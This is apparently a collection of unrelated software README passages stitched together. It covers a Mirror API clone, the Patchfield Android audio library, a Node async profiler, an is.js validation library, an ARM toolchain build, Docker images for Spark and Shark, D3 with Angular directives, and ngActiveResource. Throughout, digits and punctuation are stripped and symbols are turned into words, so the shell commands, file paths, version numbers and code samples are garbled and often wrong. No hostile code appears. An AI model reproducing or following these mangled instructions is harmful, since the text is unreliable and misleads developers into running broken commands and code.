to sign in at the this app is very limited so far but will be improved the same ui as the test ui but with the difference that the real web app will use calls directly to the mirror api while the test web app uses the self hosted mirror api clone to directly send requests to the api you will have to turn on oauth in the upper right corner of the explorer with you can then see the result at the glass emulator available at and shares correctly and send them to the mirror api server which forwards the information to the relevant subscriptions for simplification and because it s easier to implement like this for cloud endpoints this assumes that there is only one application i e one client id that uses the mirror api so you will have access to all timeline cards of a user whereas in the real mirror api you would only have access to cards created by or shared with your application not all features of the mirror api are implemented yet for example pagination and voice commands are not supported yet i m not part of the glass explorer program so there are no guarantees that the final mirror api will work anything like i suppose it will in this demo implementation even though i follow the official documentation as closely as possible copyright c  gerwin sturm foldedsoft e u and www foldedsoft at licensed under the apache license version   the license you may not use this file except in compliance with the license you may obtain a copy of the license at unless required by applicable law or agreed to in writing software distributed under the license is distributed on an as is basis without warranties or conditions of any kind either express or implied see the license for the specific language governing permissions and limitations under the license

12250505, patchfield  patchfield is an audio infrastructure for android that provides a simple callback driven api for implementing audio modules such as synthesizers and effects  a graph based api for connecting audio modules plus support for the jack audio connection kit patchfield consists of a remote or local service that acts as a virtual patchbay that audio apps can connect to plus a number of sample apps that illustrate how to implement audio modules and how to manipulate the signal processing graph the implementation resides entirely in userland and works on many stock consumer devices such as nexus  and  if you have any questions or comments don t hesitate to get in touch at on top of patchbay please tell us about it device compatibility  patchfield requires sdk version  or later it pushes the limits of the current android audio stack and it works better on some devices than on others it is also a very young project that has not yet been tested on a wide range of devices further testing and evaluation is needed patchfield has been successfully tested on nexus  nexus  both the original version and the new one  nexus s and htc  on nexus  patchfield works well as long as the patchfield service runs with foreground privileges patchfield does not seem to work well on galaxy nexus audio glitches when switching between activities  and galaxy s frequent glitches the glitches on galaxy nexus seem to be unrelated to patchfield problems of this kind have also been reported with other audio software cloning and building patchfield  make sure that you have android ndk version re or later and that ndk build is on your search path then clone the project and build the native components like this cd patchfield don t worry if javah reports errors on this initial build now you can import all projects in the patchfield directory into your development environment of choice if you build any native binaries after importing the projects into eclipse make sure to refresh your eclipse workspace or else eclipse may not see the latest version project layout  patchfield library project the core of patchfield contains the patchfieldservice class and all apis as well as utilities patchfieldcontrol sample control app and remote service configuration you will need to install this app if you want to run patchfield as a remote service note however that the patchfield service does not depend on this control app they are merely being packaged together for convenience lowpasssample sample app illustrating how to implement an audio module for patchfield complete with build files and lock free concurrency pcmsample sample app playing a wav file through patchfield crude but useful for prototyping and demos patchfieldpd library project providing an audio module implementation that uses libpd for synthesis this project is a not a toy libpd is a heavy duty signal processing library and this project fully integrates it into patchfield pdsample sample app using patchfieldpd further sample projects are available will be posted soon major components  patchfield consists of a number of components at its core is a java class patchfield java  that manages the audio graph and handles audio input and output with opensl es patchfield java is meant to be accessed through patchfieldservice java  which can run as a remote or local service i e  you can use patchfield to route audio signals between different apps or you can build apps that just use patchfield internally there are two apis for interacting with the patchfield service a java client api for querying and manipulating the state of the signal processing graph and a hybrid c and java module api for implementing new audio modules such as synthesizers and effects patchfield introduces a new permission usepatchfield apps will only be allowed to bind to patchfieldservice as a remote service if they have this permission a note on deployment  for the time being the patchfield service will not be available from google play yet the reason is that the api and protocol may change a few more times before they are finalized and so a published service would come with the risk of drifting out of sync with client apps if you want to publish patchfield based apps on google play you currently have two options if your app is self contained you can just package a copy of the patchfield service with your app or if you want to support multiple apps that exchange audio via patchfield you can publish your own copy of the patchfield service on google play and document the version of patchbay that client apps will have to use right now the recommended way of using patchfield is as a local service packaged with your app when the api and protocol have stabilized the service will be published on google play and then inter app audio routing via the common remote service will be preferable client api  the java client api is defined by two interfaces ipatchfieldservice aidl and ipatchfieldclient aidl in general clients do not synthesize or process audio but merely operate on the signal processing graph the patchfield service implements the ipatchfieldservice interface this interface provides a collection of functions for querying and manipulating the signal processing graph most clients will implement the ipatchfieldclient interface which provides a collection of callbacks that the service will invoke to inform clients of changes in the graph the sample app in patchfieldcontrol is a typical example of a client app that does no audio processing of its own rather it presents a simple user interface that visually represents the graph and lets users connect or disconnect audio modules through the ipatchfieldclient interface it keeps its representation of the graph up to date audio module api  on the java side the audio module api consists of one abstract base class audiomodule java subclasses of audiomodule must implement a method that registers the module s audio processing callback with the patchfield service plus another method that releases the native resources held by the module when they are no longer needed the audio processing callback will generally be implemented in c or c and and  using a small c api defined in audiomodule h  that only has two elements a function prototype that the signal processing callback must conform to and a function that registers the signal processing callback with the patchfield apps that use audio modules also need to bind to a patchfieldservice instance because some of the audio module setup requires the ipatchfieldservice interface the patchfieldlowpasssample project contains a typical audio module implementation as well as a simple app that shows how to use an audio module it also illustrates how to set up the build system and how to interact with the audio processing thread in a thread safe yet lock free manner sample format and buffer size  patchfield uses  bit float samples buffers are non interleaved the patchfield service operates at the native sample rate and buffer size of the device this means that audio modules must operate at the native sample rate and buffer size as well native sample rates of hz and hz are common and so audio modules must support both moreover audio modules must be prepared to work with arbitrary buffer sizes in particular apps cannot assume that the buffer size is a power of two multiples of three such as   and  have been seen in the wild the patchfield repository includes a utility library that performs buffer size adaptation for audio modules that use synthesis techniques or audio libraries that cannot operate at the native buffer size navigation between patchfield apps  in order to navigate from the control app to an audio module long click on the icon of the module in the control ui in order to navigate from an audio module to the control app long click on the back button an abstract utility class patchfieldactivity java  implements this behavior and manages the connection to the patchfield service apps that use patchfield should launch with launch mode singletask this deviates from the usual recommendations for android development but it is necessary for the navigation model of patchfield patchfield incurs no latency on top of the systemic latency of the android audio stack the audio processing callbacks of all active modules are invoked in one buffer queue callback of opensl es patchfield and google  patchfield started as a  project and google owns the copyright still this project is not an official google product

line contains  numbers total  the total amount of time spent running cpu real time  the amount of time between the first callack starting and the last callback ending cpu load  is just total and real time as node is singlethreaded this number ranges between  cpu wasn t doing anything and  cpu was running the whole time wait time  the sum of the times between each callback being created and being called high wait times can happen either because you re waiting for a lot of parallel io events or because you re waiting for other callbacks to stop using the cpu each subsequent line contains  bits of information start the time since you called new asyncprofile and when this callback started running cpu time the amount of cpu time it took to execute this callback location the point in your code at which this callback was created see also marking marking overhead the amount of cpu time it took to calculate location see also speed speed which has been subtraced from the cpu time column additionally the indentation lets you re construct the tree of callbacks sometimes it s hard to figure out exactly what s running when particularly as the point at which the underlying async callback is created might not correspond to the location of a callback function in your code at any point while the profiler is running you can mark the current callback to make it easy to spot in the profiler output javascipt asyncprofile mark something easy to spot for example in the above output i ve done that for the callback that was running redis eval and marked it as redis eval script if you need advanced behaviour you need to create the profiler manually and then run some code the profiler will be active for any callbacks created synchronously after it was javascript settimeout function p new asyncprofiler settimeout function and and dostuff like all profilers this one comes with some overhead in fact by default it has so much overhead that i had to calculate it and then subtract it from the results p there is some overhead not included in the overhead numbers but it should hopefully be fairly insignficant  s or so per async call and also not included in the profiler output you can make the profiler faster by creating it with the fast option this disables both stack trace calculation and overhead calculation javascript new asyncprofile fast true also known as help it s not displaying anything if your process happens to make an infinite cascade of callbacks often this happens with promises libraries  then you will have to manually stop the profiler manually for example using a promise you might want to do something like javascript var p new asyncprofile promise try dowork finally function p stop you can pass a callback into the constructor to generate your own output the default callback looks like this javascript new asyncprofile callback function result result print the result object looks like this javascript start    process hrtime end    process hrtime ticks  queue    when the callback was created start    when the callback was called end    when the callback finished overhead    how much time was spent inside the profiler itself parent  the tick that was running when the callback was created  this gives you a flattened tree of ticks sorted by queue time the parent will always come before its children in the array try manually stopping stopping the profiler you might have an infinite chain of callbacks or no callbacks at all some libraries like redis or mongo that use connection queues the solution is to manually create a bridge over the asynchronous call you can look at the code to see how i did it for mongo and redis pull requests are welcome either you re using node   congrats or you re including you can fix this by sending a pull request async profile is licensed under the mit license comments pull requests and issue reports are welcome

we could show the user we dropped successfully here void dragcancelled skctouchstate touchstate node position startposition naming and accessing components  let s say you added a few components to your node and now you need to change the properties of one of those components you could keep a reference to every component but that would be annoying instead just ask the component node for it objective c and and disable the component of type mycomponent callbacks will immediately stop node getcomponent mycomponent class enabled no and and or better yet get the component casted to the proper type skgetcomponent node mycomponent customproperty  most of the time each component on a node will be of a different type but if you wanted to add two components of the same type you will need to name them instead of relying on the class name objective c node addcomponent speeddoubler new withname xspeed node addcomponent speeddoubler new withname xspeed node getcomponentwithname xspeed enabled no skcomponentnodes can be a component too  if you sublcass an skcomponentnode and you want to make use of the component callbacks without creating an extra component just implement the skcomponent protocol now your node gets all the component callbacks too just make sure you call super onenter and onexit and update so the component node can do it s behind the scenes magic this

22015862, a better way to write javascript conditional statements and still have pretty code this library was inspired by the maybe monad pattern and libraries like jasmine js and jquery it allows you to write conditional statements without nested if statements or null checking just include the minified script in your project it s really tiny kb minified and zipped or if you re using typescript and why aren t you using tyepscript  include the definition file in your main class for use with node js var is require is typically a lot of checks go into working with variables especially when the values are returned by ajax calls or user input this results in a lot of nested if statements that check for values to be defined but also to pass various validation checks for instance see this code var foo bar if foo if foo length  if foo bar throw new error bad foo else if foo bar throw new error bad foo else throw new error bad foo throw new error bad foo a better way to handle this is to write the code in such a way that when any single step fails the chain is broken and none of the other steps are executed a single catch function can handle the failure so using is the preceding code can be rewritten as var foo bar is foo longerthan  equalto bar not equalto bar then console log success catch throw new error bad foo this allows the code to read almost like spoken words which hopefully leads to more maintainable code there are several methods available for checking the input value if a validation method is successful is returns an instance of is with the value otherwise it returns one with nothing in it which stops the chain var foo bar is foo longerthan number and and checks the length of a string for minimum length shorterthan number and and checks the length of a string for maximum length equalto bar and and checks for exact value not and and inverts the next validation equalto baz is  numeric and and returns true if the value is a number lessthan  and and checks for maximum value greaterthan  and and checks for minimum value is  any    and and you can use a shorthand and check for any of these things to be true is    and and or check that all validations are true is foo is length  and and check for string length is  not emptyarray and and check if array is empty contains  and and check if array has a specific value in it var validemail function val string var re and  s and  s and and and             and a za z   and and a za z  and return re test val is john doe fakeemail com is validemail and and you can use a function as an argument which returns true of false is john doe fakeemail com is validemail then consolde log valid email and and if the chain succeeds you can run a callback using then is john doefakeemail com is validemail catch consolde log bad email and and if the chain fails you can run a callback using catch is john doefakeemail com is validemail catch and and bad email finally and and using this method you can run a callback using finally no matter what happens one of the matchers above is the matchingany method this checks to see if any of the strings or shorthand matchers are true but you can also use the or method is foo bar baz prop foo lessthan  and and this is false but with the or method immedatiately following it or prop bar longerthan  and and this is true so the whole chain is valid then and and do something cool here  the best part of all this is that you no longer need to worry about undefined variable values at all for instance if you have a value like this var foo bar undefined is foo bar longerthan  catch console log no value and and this gets called no matter what the value of foo bar is you can even work with complex objects and work with their properties so for instance maybe working with form values var validemail function val string var re and  s and  s and and and             and a za z   and and a za z  and return re test val  var complexobject arr   str foo  num  email joe smith fakeemail com  is complexobject prop arr not emptyarray and prop arr contains  and and prop looks for property of complexobject named arr and prop str longerthan  and and must be called prior to each validation check and prop str shorterthan  and and and makes code more readable and prop str equalto foo and prop num numeric and prop email matching validemail then and and all of these things are true submit form catch and and at least one of these things are not true  you can also instantiate the chain by either using the new command or by using the facade is foo longerthan  then and and callback new jumpkick is foo longerthan  then and and callback
526598, arm eabi toolchain builder  this toolchain builder builds a gcc and newlib based arm eabi toolchain using the sourcery sources this makefile was originally created to allow building a validated gcc release on mac os x as codebench lite and g and and lite were only provided for windows and linux but this build also includes some optimizations for newlib that provide smaller binaries note mentor have indicated that there won t be future arm eabi releases of the free lite edition of codebench so the   release may be the last you may also be able to use a modified version of this makefile with the sources mentor provides with the professional version of codebench which they plan to continue supporting if future source releases are made available this makefile will be updated for them if not we may start to build custom versions of other gcc and newlib toolchain this build system has been tested on mac os x    small modifications may be needed in order to make it work with other platforms note if you have previously built a toolchain of another version out of the same builder directory make sure to do the following first before building with newer sources make clean also make sure that you don t have another arm non eabi gccg and and ldgdb etc toolchain in your path when you build whether it is a previous version of this same toolchain or a binary toolchain from another provider this may end up influencing how newlib in particular gets compiled requirements os x  you will need to have clang make binutils installed on your machine to compile all of this you can get most of these on mac os x by just installing the apple developer tools which are for xcode   or later the command line tools are no longer bundled by default and there is no and developer anymore to install them open xcode go to preferences downloads components command line tools this should install make gcc etc you will also need libelf and texinfo first i recommend installing these from with homebrew you can install those dependencies like this brew install libelf texinfo requirements ubuntu  these instructions should now also work on ubuntu linux provided the following packages have been installed prior to attempting the build sudo apt get install curl flex bison texinfo libelf dev autoconf build essential libncurses dev main build instructions  next build the toolchain make install cross note my most recent test on mac os x   with xcode command line tools from april  it was necessary to use the instructions in the installing gcc   section you should be able to also specify a specific install and prefix location by building using the following type of invokation prefix home and arm cs tools make install cross by default the build attempts to determine the number of cpus and sets the number of parallel jobs automatically linux os x if you re on another platform or want to use a different number of jobs you can redefine procs procs  make install cross note if you are on mac os x and are running xcode   or a similar version and are trying to build   or an earlier version of codesourcery s sources you may find that it will fail during the build of libgcc as discussed in issue  to work around this build using using these two commands instead of the above cc clang make cross binutils cross gcc cross newlib make cross gdb or with gcc   cc gcc   make install cross note gcc   has been removed from recent versions of apple s command line tools for xcode if you need this compiler you ll have to follow instructions in the gcc   section below this should build the compiler newlib gdb etc and install them all into a directory called arm cs tools in your home directory if you want to install to another location feel free to change the export lines and to adjust the definitions at the top of the makefile keep in mind that the makefile does install at the end of each build once you re done you ll likely want to add the path where the compiler was installed to to your bashprofile zshrc etc export path home and arm cs tools and bin path to clean up when you re done and you ve installed the toolchain you can clean up the intermediate files with the following command make clean installing gcc    first things first see if it is installed write gcc in your commandline and double tab if there is no file called gcc   you most likely do not have it one more check though is to check the gcc version by doing gcc v look at the last line of the output if it looks like this gcc version    based on apple inc build  llvm build    you may think you are in luck and you have gcc   unfortunately it is not that simple this is the llvm version of gcc   from apple and unfortunately does not work with the latest codesourcery packages the correct gcc version is easy to install though using homebrew brew tap homebrew and dupes brew install apple gcc and then do cc gcc   make install cross homebrew dupes also offers a gcc formula which installs at the time of this writing gcc   i have not tried this version myself but might be worth a try since   is getting pretty dated multilib build customization  by default the toolchain will build with the the multilibs included in the binary builds of g and and lite if you want to build multilibs for a larger set of targets similar to the commercial release you can build like this fullmultilibs true make install cross note building with this option will take significantly longer newlib build customization  by default this build enables a number of extra optimizations most of which relate to reducing code size for newlib by defining the following cflagsfortarget ffunction sections fdata sections put code and data into separate sections allowing for link time dprefersizeoverspeed doptimizesize pick simpler smaller code over larger optimized code os same as o but turns off optimizations that would increase code size fomit frame pointer don t keep the frame pointer in a register for functions that don t need one fno unroll loops don t unroll loops dbufsiz  limit default buffer size to  rather than  mabi aapcs enable use of arm procedure call standard not sure if this is needed any more ccasflags cflagsfortarget for an example of what the prefersizeoverspeed and optimizesize options do take a look at the following newlib often what one is giving up is manually unrolled loops or hand coded assembler that compiles to sizes larger than a simple c implementation if you want something closer to standard options that codesourcery uses simply prepend the make command as follows matchcs true make install cross for newlib this changes the flags to these cflagsfortarget g o fno unroll loops you can also define your own newlib flags newlibflags g o fno unroll loops make install cross additionally there is an option to exclude float support from newlib functions at the moment this should disable float support for io functions newlibnofloat true make install cross extras from binary distribution  some of the codesourcery cs libraries are distributed with g and and lite but the sources for these are not made available nor are the licensing terms in the binary release of g and and lite permissive of my including a small compressed download of these libraries with this build file however i have added a make target that should be able to pull down the binary linux tarball extract these libraries and a few extras and place them into the correct directories to use this type the following after you have installed your toolchain make install bin extras if you need the binary extras installed at a specific prefix you can use the following style of incantation prefix and some and other and location make install bin extras so if you had placed your pre built binaries at and usr and local and arm cs tools you could use the following prefix and usr and local and arm cs tools make install bin extras note use of these libraries is untested by the

13279165, dockerfiles to build spark and shark images for testing and development tested on ubuntu   docker version     ubuntu   docker    and    with the virtual also tested inside the virtualbox tiny core linux virtualbox vm for docker on note the earlier version of the scripts had problems with newer versions of docker   if you encounter issues please pull the master branch if you are running on mac os installed as described you need to run all commands inside the docker virtual machine by first ssh ing into it and bootdocker ssh then make sure that python is installed otherwise install it via tce ab search for python and install python tcz newer versions of the image that comes with bootdocker also do not have bash installed install package bash tcz which is required for the deployment scripts further make sure that your virtual machine running the docker daemon and the containers has sufficient memory allocated at least gb for two spark worker containers and one master container this can be done inside the virtual box gui under the properties of the virtual machine finally bootdocker save is a good way to perserve changes to the image between restarts of the virtual machine or host computer for example the scripts come in the cloned git repository see below first clone the repository this repository contains deploy scripts and the sources for the docker image files which can be easily modified the main deploy script takes the following options sudo and deploy and deploy sh usage and deploy sh i lt image gt w lt  workers gt v lt datadirectory gt c image spark or shark image from amplab and spark    amplab and spark    amplab and spark    amplab and shark    the script either starts a standalone spark cluster or a standalone spark and shark cluster for a given number of worker nodes note that on the first call it may take a while for docker to download the various images from the repository in addition to spark and shark the cluster also runs a hadoop hdfs filesystem when the deploy script is run it generates one container for the master node one container for each worker node and one extra container running a dnsmasq dns forwarder the latter one can also be used to resolve node names on the host for example to access the worker logs via the spark web ui optionally one can set the number of workers default  and a data directory which is a local path on the host that can be mounted on the master and worker containers and will appear under and data both the spark and shark shells are started in a separate container this container can be directly started from the deploy script by passing c to the deploy script each node worker and master also runs a sshd which is pre configured with the given rsa key note that you should change this key if you plan to expose services running inside the containers since the permissions of the key when cloned from the repository are likely wrong you need to change them if you intend to log in with ssh chmod go rwx apache hadoop hdfs precise and files and idrsa starting from the directory in which the repository was cloned do sudo and deploy and deploy sh i amplab and spark    w  wait for the cluster to come up note that it can take longer to download the container images the first time but after that the process is fairly quick when the cluster comes up you should see

killall sh nameserver if you prefer to build the images yourself or intend to modify them rather than downloading them from the docker repository you can build all spark and shark images in the correct order via the build script and build and buildall sh the script builds the images in an order that satisfies the chain of dependencies apache hadoop hdfs precise spark base spark master worker shell apache hadoop hdfs precise spark base shark base shark master worker shell you can always re build single images by cd ing into the image directory and doing build the following are just some comments that made the generation of the images easier it is not enforced in any way by docker the images and startup scripts follow the following structure in order to reuse as much as possible of the image they depend on there are two types of images em base and em images and em leaf and em images leaf images as the name suggests are images that are leafs in the dependency tree for example spark base as a base image depends on apache hadoop hdfs precise spark master depends on spark base as its base image and is itself a leaf in addition to its dockerfile each image has a subdirectory in its image directory that contains files config files data files that will be copied root and em imagename and em files directory inside the image base images are images that are intended to be extended by other images and therefore do not have a default command or entry point they are good for testing though e g by running and bin and bash inside them for base images such as spark base besides data files the directory also contains files and configurespark sh which is a script that contains four functions createsparkdirectories for creating required directories such as the working directory deploysparkfiles that would copy files from and root and em imagename and em files to required system path locations configurespark that changes settings in config files and takes the ip of the master as argument preparespark that calls the previous three in the given order and takes the ip of the master as argument all of the functions of a base image s configure script so also inside files and configurespark sh except preparespark first call their corresponding functions in the image the spark base image depends on apache hadoop hdfs precise in this case therefore all the underlying services get initialized before the top level service for leaf images such as spark master besides data files the directory also contains files and defaultcmd that is chosen in the image s dockerfile to be the default command or entry point to the image this means the command inside is executed whenever the container is started the default command script executes the following steps in this order  the first thing the default command does is call the prepare function of the configure script inside its base image in this case the default command script calls function preparespark inside and root and spark base and configurespark sh which is the location the configure script of spark base was copied to  after that now that the base images configuration and the configuration of the images it inherits from has completed the default command may start services it relies on such as the hadoop namenode service in the case of spark master  finally the default command script of spark master runs a second script under userid hdfs the hadoop hdfs super user  which is files and files and runsparkmaster sh that actually starts the master the spark worker default command proceeds along the same lines but starts a spark worker with a hadoop datanode instead in order to resolve names such as master  worker  etc add the ip of the nameserver container to the top of and etc and resolv conf on the host after a while building and debugging images the local image repository gets full of intermediate images that serve no real purpose other than debugging a broken build to remove these do sudo docker images and grep none and awk print  and xargs sudo docker rmi also data from stopped containers tend to accumulate in order to remove all container data only do when no containers are running do sudo docker rm sudo docker ps a q

12692072, integrating d and angular  there is a github repo  with code to accompany this post contributions are encouraged what is d  d  stands for data driven documents and is described by the authors as follows d js is a javascript library for manipulating documents based on data d helps you bring data to life using html svg and css d s emphasis on web standards gives you the full capabilities of modern browsers without tying yourself to a proprietary framework combining powerful visualization components and a data driven approach to dom manipulation what is an angular directive  an angular directive is a way to extend the functionality of html this can be done multiple ways but the most useful for our purposes now is restricting the directive to an element tag for more information see the post about how to build custom directives with angularjs  how to make d work with dependency injection  if you want do not want to use dependency injection you can add d js to your index html file as normal and skip this section in order to avoid the global d variable and use the dependecy injection in angular we need to create a factory containing the d code we need to declare the d variable before coping the d source in order to prevent the creation of a global variable file app and scripts and services and d js angular module d factory d  function var d and and d code here return d now we are able to inject d into our code by adding it to the dependency array of our module in our app js file the top line creates the d module which we add a factory to in the app and scripts and services and d js file file app and app js angular module d  angular module myapp directives  d when we create our directives that need d we have to pass d to the directive also file app and scripts and directives and dexample js angular module appapp directives directive dexample  d  function d return restrict ea  and and your directive code here basic d directive  git branch basic in this section you will learn how to create a basic d directive that will automatically size to the width of parent element in addition you will set watchers to redraw the d when the parent element size changes this is advantageous when you want to make an your d responsive based on different layouts such as mobile or tablet in addition the d will re render on a window re size so it will never be out of scale with your design in order to do this we need to divide our d code into two sections first all the code that will not change on a render such as the parent element watcher functions and helper functions second will be all the code that will change during a render such as height width data and scale you will now create a simple bar chart with hard encoded data we will explore different data sources in future sections let s start by creating the file this assumes you are using d as a dependency recommended create the following file file app and scripts and directives and dbars js angular module appapp directives directive dbars  d  function d return restrict ea  and and your directive code here if you are not using dependency injection not recommended your code should look like this file app and scripts and directives and dbars js angular module appapp directives directive dbars  function return restrict ea  and and your directive code here we need to set up our directive to use the d code we provide we will be using restrict and link properties for our basic bar chart lets add the link function now it will store our d code to learn more about the link property or its parameters read here  file app and scripts and directives and dbars js angular module appapp directives directive dbars  d  function d return restrict ea  scope  link function scope ielement iattrs and and d code will go here now we need setup our static code that will add the svg to the dom as well as watch for changes in the parent element width we will start by appending the svg to the ielement parameter which will be the html element we call this directive in we can also add the width of  here so it will fill the parent element var svg d select element  append svg attr width   next we need to add the watchers to check when the div is resized we want to watch for the window onresize event and then apply it to the angular scope then we will check the size of the parent element to see if the d needs to be re rendered in order to accomplish this we will use the following to find the width of the parent element d select ielement    offsetwidth file app and scripts and directives and dbars js replace and and d code will go here and and dummy data scope data name greg  score   name ari  score   name loser  score  and and on window resize re render d canvas window onresize function return scope apply scope watch function return angular element window  innerwidth  function return scope render scope data and and define render function scope render function data and and your changing d code here now we can define our d just as we would without angular i have chosen to use px margins on the sides bars with a height of px and a margin of  px between bars we also need to scale the data which can be done by score and maxscore and width as we will see below in the code file app and scripts and directives and dbars js replace and and your changing d code here and and remove all previous items before render canvas selectall remove and and setup variables var width height max width d select element    offsetwidth  and and  is for margins and can be changed height scope data length  and and   bar height and  margin between bars max  and and this can also be found dynamically when the data is not static and and max math max apply math  map data val val count and and set the height based on the calculations above svg attr height  height and and create the rectangles for the bar chart svg selectall rect data data enter append rect attr height   and and height of each bar attr width   and and initial width of  for transition attr x   and and half of the  side margin specified above attr y  function d i return i  and and height and margin between bars transition duration  and and time of duration attr width  function d return d score and max and width and and width based on scale our directive is complete now we just need to add it to the html for an example html file look at app and index html basic with data as attribute  git branch basic scope directives can be written to take advantage of angular s html functionality we can pass data from the current scope through an html attribute into the d directive this allows us to reuse the directive across multiple controllers in this example we will move the dummy data from the directive to the controller file app and scripts and controllers and democtrl js angular module myapp controllers controller democtrl  scope  function scope scope greeting resize the page to see the re rendering scope ddata name greg  score   name ari  score   name loser  score  we will then add the data attribute into the html directive element d bars data ddata and d bars this will allow the svg to be rendered based on data in the controller but what if we want to also re render it on the data being changed we will need to watch the data we also will want to watch the data for objectequality instead of the default reference so that the d will re render when a property in the ddata object changes and and watch for data changes and re render scope watch data  function newvals oldvals return scope render newvals  true in order to show this working the app and index html file has been updated with inputs to modify the ddata object it also uses the same directive from two different controllers go experiment with it tip try removing the true from the watch function above and see what happens why does this happen to learn more read about the objectequality  parameter of the watch function basic with data and key names as attributes  git branch basic labels let say we want to add text labels to the data we are now showing if you look carefully at the ddata objects in the two controllers they do not have the same key names democtrl uses name while democtrl uses title if we add the labels to the d code we have to specify the key name as shown here file app and scripts and directives and dbasic js svg selectall text data data enter append text attr fill  fff attr y  function d i return i  and  attr x   text function d return d name this will only show the labels on democtrl and not democtrl if we want to be able to display both of them we could pass the key in as an attribute string file app and scripts and directives and dbasic js restrict ea  data  label link function scope ielement iattrs text function d return d scope label file app and index html d bars data ddata label name and d bars d bars data ddata label title and d bars take the label attributes out and change line  to say text function d return d name this could also have been done using a controller scope variable instead of a string if you wanted that would be a quick change like shown below this is not in the git repo file app and scripts and directives and dbasic js restrict ea  data  label link function scope ielement iattrs file app and index html d bars data ddata label dlabel and d bars d bars data ddata label dlabel and d bars file app and scripts and controllers and democtrl js scope dlabel name file app and scripts and controllers and democtrl js scope dlabel title basic with click events  git branch basic click now we have data being watched and drawn based on screen width and scope variables let s add some click events that trigger a function on the controller this can be done by adding a function name as an attribute in order to pass data through to the scope function an object with the key item has to be used scope onclick item stuff to pass here first we need to create the function on the controller scope file app and scripts and controllers and democtrl js scope donclick function item alert item name then we need to add the attribute to the html file app and index html d bars data ddata label dlabel on click donclick item and d bars finally we need to add the attribute and click event in the directive file app and scripts and directives and dbasic js restrict ea  data  label  onclick link function scope ielement iattrs and and goes after line  append rect on click  function d i return scope onclick item d tip try to get this working with democtrl there are way more interesting ways to integrate d and angular together if you have any fixes or additions please fork the repo and submit them i hope you learned something let me know your feedback in the comments below if you create a section please make a branch with your additions and specify the branch as i have done in the readme thanks this and many other great sources of information are thanks to my time and connections i made at hackreactor

15258399, activeresource provides a base class to make modelling with angular easier it provides associations caching api integration validations and active record pattern persistence methods if you have bower install just run javascript bower install ngactiveresource save dev once downloaded you ll find everything you need in the and dist directory include either file and add it as a dependency in your module javascript angular module app  activeresource note don t forget to include lodash js before active resource js in your bower json ngactiveresource latest say you want a form to add comments to a post form ng submit comment save input ng model comment text input type submit comment text in your controller all you have to setup is something like this javascript post find postid then function response scope post response scope comment scope post comments new comment after save  function scope comment scope post comments new you don t even have to tell ng repeat to load in the new comment the new comment will already be added to the post by association simply tell the comment object on the scope to clear so that the user can enter another create an angular factory or provider that relies on activeresource javascript angular module app  activeresource factory post  activeresource  function activeresource function post data this number id this string title this string subtitle this computedproperty fulltitle  function return this title and this subtitle  title  subtitle this hasmany comments this belongsto author  post inherits activeresource base post dependentdestroy comments return post the model is terse but gains a lot of functionality from activeresource base it declares a has many relationship on comment allowing it to say things like javascript var post post new title my first post var comment post comments new text great post the new comment will be an instance of the class comment which will be defined in its own model it also declares a belongs to relationship on author this allows it to say things like javascript var author author new comment author author comment save then function response comment response this will also cause author comments to include this instance of comment post also declares a dependent destroy relationship on comments meaning javascript post delete then function response post comment response expect post not tobedefined expect comment not tobedefined expect post find title my first post not tobedefined expect comment find text great post not tobedefined this means the post and its comments have been deleted both locally and from the database the astute reader will notice methods prefaced with are interacting with an api the api calls are established in the model definition under post api set following the syntax of ember js computed properties you can create properties that auto magically update with or without angular s two way binding javascript function tshirt this number price this computedproperty saleprice  function return this price this price    price this computedproperty supersaleprice  function return this price this saleprice  price  saleprice a has many association can be setup by naming the field if the field name is also the name of the provider that contains the foreign model this is all you have to say if the name of the provider is different you can set it explicitly via the provider option javascript this hasmany comments  provider commentmodel foreign keys will also be intuited for instance javascript this belongsto post expect the model to define a postid attribute mapping to the primary key of the post to which it belongs if the foreign key is different you can set it explicitly javascript this belongsto post  foreignkey mypostid any number of options can be set on the association javascript this belongsto post  provider postmodel  foreignkey mypostid activeresource adds two types of methods to your models and instances  api updating methods these are prefaced with  such as create  save  update  and delete  and are the unsafe methods in a restful api post put and delete these methods will call the api using the urls you ve set as modelname api createurl modelname api updateurl and modelname api deleteurl the api set method sets default api urls for you but you can override these defaults by setting them explicitly  local instance creating and finding methods these include new  find  where  all  and update new creates a new instance of a model on the client and update updates that instance without issuing a put request find will attempt to find local instances in the model s client side cache before issuing a get request and where and all will always issue a get request to ensure it has all instances of a model that match given terms these are the safe methods in a restful api get best case scenario you have an api that adheres to activeresource s restful convention here s that convention and http verb and crud and path and action and used to and and and and and and and and get and retrieve and and users and index and display a list of all users or all users filtered by querystring and and get and retrieve and and users and id and show and display a specific user found by params or querystring and and post and create and and users and create and create a user and and put and update and and users and id and update and update a specific user and and delete and destroy and and users and id and destroy and delete a specific user and if you do have an api that follows these conventions hooking it up to activeresource is as easy as javascript optionally you can specify a format for your requests javascript many apis are set up to respond with specified data types if they are specified in the urls a request like javascript post find id  will send the request javascript if you need to override specific urls javascript to signal to activeresource that you want it to replace parameters in your url simply type them following a colon javascript post api showurl and posts and id post api showurl and posts and id and and mongodb the parameters themselves will be replaced javascript post find id  if no parameters are not provided or your request utilizes parameters that are not specified in the search url then a querystring will be generated javascript post find authorid  the indexurl is intended as a search url it is not expected to be parameterized though you can parameterize it by default that means it will search using a querystring javascript post where authorid  javascript post find title my great post find is used to retrieve a single instance of a model it is a method akin to the show action in a restful api therefore it first attempts to use the showurl  and will fall back on the indexurl if a showurl is not defined find returns only the first instance it finds if the instance is already stored into the browser s cache it will not make a backend request to force a backend request you can add the forceget request option javascript post find title my great post  forceget true by default find will also eagerly load a single level of associations if a post has many comments and we find a post then its comments will be loaded as well but the comments will not load their authors or other comment based associations to load associations associations pass the option javascript overeager true warning  over eager loading is potentially very resource intensive and will often pull down sizeable portions of the database to lazily load associations not load even the first level of associations aka comments in the example above  pass the option javascript lazy true let s say you re working with a sort of crummy api it doesn t have an endpoint to find a single instance of a particular model or it won t parse a variety of options like title for our post maybe it only parses by id  and you must find the post by title in that case hit your index api the endpoint that returns all instances of a given resource  and pass the option javascript noinstanceendpoint true this option will do the parsing on the client side for you to overcome the gnarly api similar to the find method but it will pull all instances matching the given parameters where will always query the backend assuming that it does not have the necessary instances where is akin to the index action in a restful api and therefore first attempts to use the indexurl  and will fall back on the showurl if an indexurl is not defined javascript post where authorid author id returns all instances takes no parameters javascript post all all is just a shorthand for a where request with no search parameters specified it therefore will use the whereurl  if defined all queries are promise based javascript post where authorid author id then function response post response by default models will assume a primary key field labeled id  but you can set a custom one like so javascript function post attributes post primarykey id if you want a model to delete certain associated resources when they themselves are deleted use dependentdestroy javascript post dependentdestroy 